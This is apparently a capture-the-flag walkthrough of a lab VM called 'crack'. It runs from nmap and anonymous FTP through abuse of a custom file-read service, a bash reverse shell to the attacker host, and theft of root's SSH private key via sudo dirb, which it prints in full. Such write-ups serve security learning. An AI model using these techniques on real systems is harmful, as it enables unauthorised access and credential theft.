@@ -1,1 +1,435 @@
+			ENUMERATION
+			
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.56 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 17:45 +03
+Nmap scan report for 10.0.2.56
+Host is up (0.00080s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE  VERSION
+21/tcp    open  ftp      vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.54
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+4200/tcp  open  ssl/http ShellInABox
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Shell In A Box
+| ssl-cert: Subject: commonName=crack
+| Not valid before: 2023-06-07T10:20:13
+|_Not valid after:  2043-06-02T10:20:13
+12359/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     File to read:NOFile to read:
+|   NULL: 
+|_    File to read:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port12359-TCP:V=7.94SVN%I=7%D=5/12%Time=6640D62D%P=x86_64-pc-linux-gnu%
+SF:r(NULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:N
+SF:OFile\x20to\x20read:");
+MAC Address: 08:00:27:D6:6D:52 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.80 ms 10.0.2.56
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.54 seconds
+
+
+
+---open ftp, ssl/http ports and one unknown service, ftp anonymous login is allowed---
+
+
+---I want to check if there is any website, we see that ssl certificate is implemented and the port number is
+4200, let's check it---
+
+
+https://10.0.2.56:4200/
+
+
+---we come across a login to the system crack, we don't know any credentials yet, let's keep on exploring---
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ftp 10.0.2.56
+Connected to 10.0.2.56.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.56:okina): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||39825|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
+226 Directory send OK.
+
+ftp> cd upload
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||35083|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
+226 Directory send OK.
+
+
+
+---we see a python file, let's see what it does---
+
+
+
+ftp> more crack.py
+
+import os
+import socket
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+port = 12359
+s.bind(('', port))
+s.listen(50)
+
+c, addr = s.accept()
+no = "NO"
+while True:
+        try:
+                c.send('File to read:'.encode())
+                data = c.recv(1024)
+                file = (str(data, 'utf-8').strip())
+                filename = os.path.basename(file)
+                check = "/srv/ftp/upload/"+filename
+                if os.path.isfile(check) and os.path.isfile(file):
+                        f = open(file,"r")
+                        lines = f.readlines()
+                        lines = str(lines)
+                        lines = lines.encode()
+                        c.send(lines)
+                else:
+                        c.send(no.encode())
+        except ConnectionResetError:
+                pass
+
+
+
+---let's download it---
+
+
+ftp> get crack.py
+local: crack.py remote: crack.py
+229 Entering Extended Passive Mode (|||59241|)
+150 Opening BINARY mode data connection for crack.py (849 bytes).
+100% |***********************************|   849        3.06 MiB/s    00:00 ETA
+226 Transfer complete.
+849 bytes received in 00:00 (374.31 KiB/s)
+ 
+
+
+---the python script waits for us to send a file name. Then checks if the file exists in both the 
+upload directory in ftp and in the filesystem. If the file exists
+in both locations it reads the file and sends it back to us---
+
+
+---so we can listen from this server connection to gain info about the target system---
+
+
+---I create a file named passwd then upload it to the ftp server--- 
+
+
+
+
+┌──(root㉿kali)-[/home/okina/]
+└─# touch passwd                        
+       
+
+
+ftp> put passwd 
+local: passwd remote: passwd
+229 Entering Extended Passive Mode (|||14885|)
+150 Ok to send data.
+     0        0.00 KiB/s 
+226 Transfer complete.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||16516|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
+-rw-------    1 107      114             0 May 12 21:16 passwd
+
+
+
+---now that we meet the requirements we can set up our listener---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc 10.0.2.56 12359                   
+File to read:
+
+
+---here we can look at the files within the target system, I decide to check for the possible 
+usernames and hashes---
+
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc 10.0.2.56 12359                   
+File to read:/etc/passwd
+.
+root:x:0:0:root:/root:/bin/bash\n,
+.
+.
+
+cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n, 
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n,
+.
+.
+.
+.
+.
+
+
+---here we see the user cris---
+
+
+
+---We found credentials, let's check the website try to login as cris---
+
+
+
+---We don't know the password, I try cris for the password and boom, we are in the crack system---
+
+cris : cris
+
+
+
+---The shell we get into is restricted, let's create a reverse shell there and set up a listener 
+from our terminal---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 6060     
+listening on [any] 6060 ...
+
+
+
+crack login: cris                         
+Password:
+Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent      
+permitted by applicable law.
+Last login: Sun May 12 21:20:14 CEST 2024 from 10.0.2.54 on pts/0                                                                                                                              
+cris@crack:~$ /bin/bash -i >& /dev/tcp/10.0.2.54/6060 0>&1                                                                                                                                     
+
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 6060     
+listening on [any] 6060 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.56] 52414
+cris@crack:~$ ls  
+ls
+crack.py
+user.txt
+ziempre.py
+
+cris@crack:~$ cat user.txt
+cat user.txt
+---First User Flag---
+
+
+
+
+---we are in and got our first flag. Let's look around to find any clues---
+
+			
+			
+cris@crack:~$ sudo -l
+sudo -l
+Matching Defaults entries for cris on crack:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cris may run the following commands on crack:
+    (ALL) NOPASSWD: /usr/bin/dirb
+
+
+
+---here we see that we can run dirb, so what comes to mind is that we run our python web server on a specified
+port, scan it from the victim machine using dirb and the results we get will be visible in our python
+server---
+
+
+
+---the url I will scan will be /root/.ssh/id_rsa in order to capture any ssh id_rsa files so then we can use them
+to become admin afterwards---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+
+
+---run dirb from target machine---
+
+
+cris@crack:~$ sudo /usr/bin/dirb http://10.0.2.54:8000/ /root/.ssh/id_rsa               
+-----------------                        
+DIRB v2.22                                                                                                                      
+By The Dark Raver                 
+----------------- 
+START_TIME: Mon May 13 00:32:48 2024                                                                                                                                                           
+URL_BASE: http://10.0.2.54:8000/                                                                                                                                                               
+WORDLIST_FILES: /root/.ssh/id_rsa                 
+-----------------               
+GENERATED WORDS: 38
+---- Scanning URL: http://10.0.2.54:8000/ ----
+-----------------
+END_TIME: Mon May 13 00:32:48 2024               
+DOWNLOADED: 38 - FOUND: 0                                                                                                                                                                      
+
+
+
+
+
+
+---we get this result in our listener python server---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.0.2.57 - - [13/May/2024 01:04:47] code 404, message File not found
+10.0.2.57 - - [13/May/2024 01:04:47] "GET /randomfile1 HTTP/1.1" 404 -
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+
+
+---I save all the results to a file named logs---
+
+---and now in order to turn this into a ssh id_rsa key file format we put in following command---
+
+┌──(root㉿kali)-[/home/okina]
+└─# cat logs |grep -P '(?<= /)[^ ]+' -o|sed '1,2d' > id_rsa
+               
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/30- CRACK LINUX CTF]
+└─# nano id_rsa    
+                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/30- CRACK LINUX CTF]
+└─# cat id_rsa                                            
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
+-----END OPENSSH PRIVATE KEY-----
+                     
+
+
+---the final result should look like this---
+
+			
+
+---let's use this id_rsa key in the victim machine to become root---
+
+
+
+
+			PRIVILEGE ESCALATION
+
+
+cris@crack:~$ ssh root@127.0.0.1 -p 22 -i id_rsa
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent      
+permitted by applicable law.
+Last login: Wed Jun  7 22:11:49 2023
+
+root@crack:~# cd ~
+root@crack:~# ls                   
+root_fl4g.txt                                                                                                                                                                                
+root@crack:~# cat root_fl4g.txt                                                                                                                              
+---Root User Flag---
 
